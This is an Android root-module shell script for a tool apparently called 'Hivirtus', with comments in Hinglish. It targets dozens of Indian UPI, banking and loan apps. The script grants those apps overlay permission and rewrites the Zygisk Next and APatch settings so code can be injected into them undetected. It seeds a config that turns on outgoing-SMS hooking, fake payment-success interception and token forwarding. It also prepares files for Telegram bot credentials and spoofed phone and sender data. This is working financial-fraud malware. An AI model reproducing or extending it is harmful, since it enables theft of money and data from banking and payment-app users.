#!/system/bin/sh
# Hivirtus native overlay helpers — SAFE (v1.0.6+)
# NEVER touch phone / telephony / settings / systemui (SIM crash)

hivirtus_native_overlay_ready() {
  echo 1 > /data/local/tmp/hivirtus_native_overlay.active 2>/dev/null
  chmod 644 /data/local/tmp/hivirtus_native_overlay.active 2>/dev/null
  date +%s > /data/local/tmp/hivirtus_module_heartbeat.txt 2>/dev/null
  chmod 644 /data/local/tmp/hivirtus_module_heartbeat.txt 2>/dev/null
}

hivirtus_is_system_forbidden() {
  pkg="$1"
  case "$pkg" in
    com.android.phone|com.android.providers.telephony|com.android.settings|\
    com.android.systemui|com.android.shell|com.android.keychain|\
    com.android.mms.service|com.android.se|com.android.nfc|\
    com.android.networkstack|com.android.networkstack.tethering|\
    com.samsung.android.settings|com.samsung.android.app.telephonyui|\
    com.samsung.android.dialer|com.miui.securitycenter|\
    com.android.phone:*|com.android.settings:*|com.android.providers.telephony:*)
      return 0 ;;
  esac
  echo "$pkg" | grep -qE '^(com\.android\.|android\.|com\.google\.android\.permissioncontroller)' && return 0
  echo "$pkg" | grep -qiE 'telephony|simsettings|sim\.|phone$' && return 0
  return 1
}

hivirtus_mark_foreground_upi() {
  pkg="$1"
  [ -z "$pkg" ] && return 1
  hivirtus_is_system_forbidden "$pkg" && return 1
  echo "$pkg" > /data/local/tmp/hivirtus_active_hook_pkg.txt 2>/dev/null
  chmod 644 /data/local/tmp/hivirtus_active_hook_pkg.txt 2>/dev/null
  echo "foreground:$pkg" >> /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
  hivirtus_native_overlay_ready
  hivirtus_grant_overlay_permission "$pkg"
}

hivirtus_pkg_installed() {
  pkg="$1"
  [ -z "$pkg" ] && return 1
  pm list packages "$pkg" 2>/dev/null | grep -qx "package:$pkg"
}

hivirtus_grant_one_overlay() {
  pkg="$1"
  [ -z "$pkg" ] && return 0
  hivirtus_is_system_forbidden "$pkg" && return 0
  hivirtus_pkg_installed "$pkg" || return 0

  appops set "$pkg" SYSTEM_ALERT_WINDOW allow 2>/dev/null
  cmd appops set "$pkg" SYSTEM_ALERT_WINDOW allow 2>/dev/null
  appops set "$pkg" android:system_alert_window allow 2>/dev/null
  cmd appops set "$pkg" android:system_alert_window allow 2>/dev/null
  appops set "$pkg" 24 allow 2>/dev/null
  cmd appops set "$pkg" 24 allow 2>/dev/null

  echo "$pkg" >> /data/local/tmp/hivirtus_overlay_perms.txt 2>/dev/null
}

# Sirf UPI/finance — phone/settings/launcher NAHI
hivirtus_overlay_core_pkgs() {
  cat <<'PKGS'
com.phonepe.app
com.phonepe.app.business
net.one97.paytm
com.paytm.business
com.google.android.apps.nbu.paisa.user
in.org.npci.upiapp
com.yespay.next
com.yesbank.yespay
com.yesbank.yespaynext
com.kreditbee.android
com.whizdm.moneyview.loans
com.stashfin.android
com.snapmint.customerapp
com.dreamplug.androidapp
com.csam.icici.bank.imobile
com.hdfcbank.payzapp
com.axis.mobile
com.sbi.lotusintouch
com.groww.app
com.nextbillion.groww
com.fampay.in
com.mobikwik_new
com.freecharge.android
com.bharatpe.app
com.mpokket.app
com.kissht.android
com.nira.finance
com.lazypay.app
com.naviapp
com.navi.moneymanager
com.myairtelapp
com.jio.myjio
com.amazon.mShop.android.shopping
com.slice.app
com.postpe.app
com.earlysalary.android
com.zestmoney.android
com.buddyloan.app
com.paysense.android
com.cashe.android
com.rupeeredee.app
com.flexsalary
com.availfinance
com.bajajfinserv
com.epifi.paisa
com.jar.app
com.angelbroking.angelone
com.samsung.android.spay
com.popclub.android
com.tataneu
com.herofincorp.diyjourneys
com.herofincorp.simplycash
com.customer.herofincorp
com.herofincorp.android
com.herofincorp.lending
com.herofincorp.upi
PKGS
}

hivirtus_grant_overlay_permission() {
  EXTRA_PKG="$1"
  : > /data/local/tmp/hivirtus_overlay_perms.txt 2>/dev/null
  chmod 644 /data/local/tmp/hivirtus_overlay_perms.txt 2>/dev/null

  hivirtus_overlay_core_pkgs | while read -r pkg; do
    [ -n "$pkg" ] && hivirtus_grant_one_overlay "$pkg"
  done

  for f in /data/local/tmp/hivirtus_active_hook_pkg.txt \
    /data/local/tmp/hivirtus_grant_overlay_pkg.txt; do
    [ -f "$f" ] || continue
    while read -r pkg; do
      pkg=$(echo "$pkg" | tr -d '\r\n ')
      [ -n "$pkg" ] && hivirtus_grant_one_overlay "$pkg"
    done < "$f"
  done

  [ -n "$EXTRA_PKG" ] && hivirtus_grant_one_overlay "$EXTRA_PKG"
  echo "overlay_grant:$(date +%s)" >> /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
  chmod 644 /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
}

# EMERGENCY: SIM/Settings crash repair — APatch/Magisk se phone ko Zygisk se hatao
hivirtus_repair_sim_settings() {
  echo "repair_sim_start:$(date +%s)" >> /data/local/tmp/hivirtus_overlay.debug 2>/dev/null

  # 1) APatch package_config — phone/settings MUST be exclude=1 (Zygisk mat ghusao)
  AP_CFG="/data/adb/ap/package_config"
  if [ -f "$AP_CFG" ]; then
    TMP="/data/local/tmp/hivirtus_ap_cfg_fixed.csv"
    # Keep header; force critical system pkgs to exclude=1
    awk -F, 'BEGIN{OFS=","}
      NR==1 {print; next}
      $1=="com.android.phone" || $1=="com.android.providers.telephony" ||
      $1=="com.android.settings" || $1=="com.android.systemui" ||
      $1=="com.android.mms.service" || $1=="com.android.shell" ||
      $1=="com.samsung.android.settings" || $1=="com.samsung.android.app.telephonyui" {
        $2=1; print; next
      }
      {print}
    ' "$AP_CFG" > "$TMP" 2>/dev/null
    if [ -s "$TMP" ]; then
      cp -f "$TMP" "$AP_CFG" 2>/dev/null
      chmod 644 "$AP_CFG" 2>/dev/null
      echo "apatch_cfg_repaired" >> /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
    fi
    rm -f "$TMP" 2>/dev/null
  fi

  # Stop future bad seeds
  rm -f /data/local/tmp/hivirtus_apatch_config_seeded.flag 2>/dev/null
  # Mark: never re-seed dangerous csv
  echo "1" > /data/local/tmp/hivirtus_apatch_seed_disabled.flag 2>/dev/null
  chmod 644 /data/local/tmp/hivirtus_apatch_seed_disabled.flag 2>/dev/null

  # 2) Magisk denylist — phone/settings pe inject mat hone do
  if command -v magisk >/dev/null 2>&1; then
    for p in com.android.phone com.android.providers.telephony \
      com.android.settings com.android.systemui com.android.mms.service; do
      magisk --denylist add "$p" 2>/dev/null
    done
    echo "magisk_denylist_ok" >> /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
  fi

  # 3) Reset dangerous appops on system pkgs (SEND_SMS / overlay)
  for p in com.android.phone com.android.providers.telephony com.android.settings \
    com.android.systemui com.android.mms.service; do
    appops set "$p" SEND_SMS default 2>/dev/null
    cmd appops set "$p" SEND_SMS default 2>/dev/null
    appops set "$p" SYSTEM_ALERT_WINDOW default 2>/dev/null
    cmd appops set "$p" SYSTEM_ALERT_WINDOW default 2>/dev/null
  done

  # 4) Clear mass-hook lists that caused "sab apps hooked"
  rm -f /data/local/tmp/hivirtus_hooked_pkgs.txt 2>/dev/null
  rm -f /data/local/tmp/hivirtus_active_upi_all.txt 2>/dev/null

  # 5) Soft-restart phone process (SIM wapas aane ke liye) — settings crash fix
  if command -v am >/dev/null 2>&1; then
    am force-stop com.android.phone 2>/dev/null
    am force-stop com.android.settings 2>/dev/null
    am force-stop com.android.providers.telephony 2>/dev/null
  fi

  echo "repair_sim_done:$(date +%s)" >> /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
  chmod 644 /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
}

hivirtus_install_overlay_apk() { return 0; }
hivirtus_start_overlay_service() { hivirtus_native_overlay_ready; }

hivirtus_boot_activate_overlay() {
  hivirtus_native_overlay_ready
  # CRITICAL: pehle SIM/settings repair
  hivirtus_repair_sim_settings

  : > /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
  chmod 666 /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
  echo "boot_overlay_safe:$(date +%s)" >> /data/local/tmp/hivirtus_overlay.debug 2>/dev/null

  MOD="${MODDIR:-${MODPATH:-/data/adb/modules/hivirtus_zygisk_mode}}"
  if [ -f "$MOD/bridge.dex" ]; then
    cp -f "$MOD/bridge.dex" /data/local/tmp/hivirtus_bridge.dex 2>/dev/null
    chmod 644 /data/local/tmp/hivirtus_bridge.dex 2>/dev/null
    echo "bridge_dex_copied" >> /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
  fi
  if [ -d "$MOD/ui" ]; then
    mkdir -p /data/local/tmp/hivirtus_ui 2>/dev/null
    cp -f "$MOD/ui/"* /data/local/tmp/hivirtus_ui/ 2>/dev/null
    chmod 644 /data/local/tmp/hivirtus_ui/* 2>/dev/null
    echo "ui_copied" >> /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
  fi
  # Ensure Madara bubble logo readable
  if [ -f "$MOD/ui/bubble_logo.png" ]; then
    cp -f "$MOD/ui/bubble_logo.png" /data/local/tmp/hivirtus_ui/bubble_logo.png 2>/dev/null
    chmod 644 /data/local/tmp/hivirtus_ui/bubble_logo.png 2>/dev/null
    echo "logo_copied" >> /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
  fi
  # Overlay sirf UPI — system pkgs pe nahi
  hivirtus_grant_overlay_permission
}

# PhonePe/GPay cannot CREATE files in /data/local/tmp (SELinux).
# Root creates empty 0666 placeholders → app can OVERWRITE → TG Save works.
hivirtus_seed_app_writable_files() {
  local f quiet="${1:-}"
  for f in \
    /data/local/tmp/hivirtus_ui_save.json \
    /data/local/tmp/hivirtus_telegram_credentials.json \
    /data/local/tmp/hivirtus_tg_forward.log \
    /data/local/tmp/hivirtus_tg_last_response.txt \
    /data/local/tmp/hivirtus_tg_test_response.txt \
    /data/local/tmp/hivirtus_tg_test_payload.json \
    /data/local/tmp/hivirtus_save_ok.flag \
    /data/local/tmp/hivirtus_hook_status.txt \
    /data/local/tmp/hivirtus_spoof_phone.txt \
    /data/local/tmp/hivirtus_sender_id.txt
  do
    if [ ! -f "$f" ]; then
      case "$f" in
        *ui_save.json|*zygisk_mode_config.json) echo '{}' > "$f" 2>/dev/null ;;
        *telegram_credentials.json) echo '{}' > "$f" 2>/dev/null ;;
        *) : > "$f" 2>/dev/null ;;
      esac
    fi
    chmod 666 "$f" 2>/dev/null
  done
  # tg_test.request — DO NOT auto-create (spam). Only chmod if Save created it.
  [ -f /data/local/tmp/hivirtus_tg_test.request ] && chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
  if [ -f /data/local/tmp/hivirtus_zygisk_mode_config.json ]; then
    chmod 666 /data/local/tmp/hivirtus_zygisk_mode_config.json 2>/dev/null
  else
    # Safe defaults with intercept ON (A16 unread pe bhi module.prop path fallback)
    cat > /data/local/tmp/hivirtus_zygisk_mode_config.json << 'EOF'
{
  "hook_outgoing_sms": true,
  "intercept_fake_success": true,
  "hook_all_upi_apps": true,
  "fake_intercept_telegram": true,
  "auto_forward_token": true
}
EOF
    chmod 666 /data/local/tmp/hivirtus_zygisk_mode_config.json 2>/dev/null
  fi
  if [ "$quiet" != "quiet" ] && [ ! -f /data/local/tmp/hivirtus_tg_seeded.flag ]; then
    echo "tg_files_seeded $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
    echo 1 > /data/local/tmp/hivirtus_tg_seeded.flag
    chmod 644 /data/local/tmp/hivirtus_tg_seeded.flag 2>/dev/null
  fi
  chmod 666 /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
}

# Diagnose + force-queue TG test when token present anywhere
hivirtus_tg_watchdog() {
  local src="" tg_t="" tg_c=""
  for src in \
    /data/local/tmp/hivirtus_ui_save.json \
    /data/local/tmp/hivirtus_telegram_credentials.json \
    /data/local/tmp/hivirtus_zygisk_mode_config.json \
    /data/adb/modules/hivirtus_zygisk_mode/config.json
  do
    [ -f "$src" ] || continue
    [ -z "$tg_t" ] && tg_t=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    [ -z "$tg_c" ] && tg_c=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  done
  # Also harvest PhonePe filesDir
  hivirtus_harvest_saves 2>/dev/null
  for src in /data/local/tmp/hivirtus_ui_save.json /data/local/tmp/hivirtus_telegram_credentials.json; do
    [ -f "$src" ] || continue
    [ -z "$tg_t" ] && tg_t=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    [ -z "$tg_c" ] && tg_c=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  done

  if [ -z "$tg_t" ] || [ -z "$tg_c" ] || [ ${#tg_t} -lt 20 ]; then
    # Only log empty status once every ~60s
    NOW=$(date +%s)
    LAST=$(cat /data/local/tmp/hivirtus_tg_empty_log.ts 2>/dev/null || echo 0)
    if [ $((NOW - LAST)) -ge 60 ]; then
      echo "tg_creds_EMPTY — PhonePe bubble → TELEGRAM tab → Token+Chat → Save $(date +%s)" \
        >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
      echo "$NOW" > /data/local/tmp/hivirtus_tg_empty_log.ts
    fi
    return 0
  fi

  printf '%s\n' "{\"telegram_bot_token\":\"${tg_t}\",\"telegram_chat_id\":\"${tg_c}\"}" \
    > /data/local/tmp/hivirtus_telegram_credentials.json
  chmod 666 /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null
  HASH="${tg_t}|${tg_c}"
  OLD=$(cat /data/local/tmp/hivirtus_tg_creds.hash 2>/dev/null)
  SENT=$(cat /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null)
  # Watchdog NEVER queues TG test — only Save path may queue (spam fix)
  echo "$HASH" > /data/local/tmp/hivirtus_tg_creds.hash
  if [ -z "$SENT" ] && [ -z "$OLD" ]; then
    : # first boot with creds — boot subshell handles one test
  fi
}

# Zygisk Next Enforced denylist blocks Virtus in UPI/banking apps.
# Unmount Only (just_umount) = hide mounts + still allow Zygisk inject.
hivirtus_fix_zn_denylist() {
  local znctl=""
  for c in \
    /data/adb/modules/zygisksu/bin/znctl \
    /data/adb/modules/zygisksu/bin/zygiskd \
    /data/adb/modules/zygisksu/bin/zygiskd64 \
    /data/adb/zygisksu/bin/znctl
  do
    [ -x "$c" ] && znctl="$c" && break
  done
  if [ -z "$znctl" ] && command -v znctl >/dev/null 2>&1; then
    znctl="$(command -v znctl)"
  fi
  if [ -n "$znctl" ]; then
    if "$znctl" enforce-denylist just_umount \
      >/data/local/tmp/hivirtus_zn_denylist.txt 2>&1; then
      echo "zn_denylist=just_umount_ok via $znctl" >> /data/local/tmp/hivirtus_inject.log 2>/dev/null
      echo "OK: Zygisk Next Denylist → Unmount Only. Open GPay/YesPay then recheck inject.log" \
        > /data/local/tmp/hivirtus_zn_hint.txt
    else
      echo "zn_denylist=CMD_FAIL via $znctl" >> /data/local/tmp/hivirtus_inject.log 2>/dev/null
      echo "FIX: Zygisk Next UI → Denylist Policy → Unmount Only → reboot" \
        > /data/local/tmp/hivirtus_zn_hint.txt
      echo "HINT: manually set Denylist=Unmount Only in ZygiskNext" \
        >> /data/local/tmp/hivirtus_inject.log 2>/dev/null
    fi
  else
    echo "zn_denylist=NO_ZNCTL" >> /data/local/tmp/hivirtus_inject.log 2>/dev/null
    echo "FIX: Zygisk Next → Denylist Policy → Unmount Only (NOT Enforced) → reboot" \
      > /data/local/tmp/hivirtus_zn_hint.txt
    echo "HINT: ZygiskNext Denylist must be Unmount Only (Enforced blocks inject)" \
      >> /data/local/tmp/hivirtus_inject.log 2>/dev/null
  fi
  chmod 644 /data/local/tmp/hivirtus_zn_hint.txt 2>/dev/null
  chmod 666 /data/local/tmp/hivirtus_inject.log 2>/dev/null
}

# APatch: UPI apps pe exclude=0 so Zygisk Next inject allow
hivirtus_apatch_allow_upi_inject() {
  AP_CFG="/data/adb/ap/package_config"
  [ -f "$AP_CFG" ] || return 0
  TMP="/data/local/tmp/hivirtus_ap_upi_fix.csv"
  UPI_RE='phonepe|paytm|paisa|yespay|yesbank|kreditbee|moneyview|mobikwik|postpe|upi|payzapp|bhim|freecharge|stashfin|snapmint|dreamplug|fampay|slice|navi|bharatpe|supermoney|groww|hdfc|icici|axis|sbi|kotak|idfc|baroda'
  awk -F, -v re="$UPI_RE" 'BEGIN{OFS=","}
    NR==1 {print; next}
    $1 ~ re {
      # exclude=0 → allow zygisk/module path; keep other cols
      $2=0
      print
      next
    }
    {print}
  ' "$AP_CFG" > "$TMP" 2>/dev/null
  if [ -s "$TMP" ]; then
    cp -f "$TMP" "$AP_CFG" 2>/dev/null
    chmod 644 "$AP_CFG" 2>/dev/null
    echo "apatch_upi_exclude0" >> /data/local/tmp/hivirtus_inject.log 2>/dev/null
  fi
  rm -f "$TMP" 2>/dev/null
}
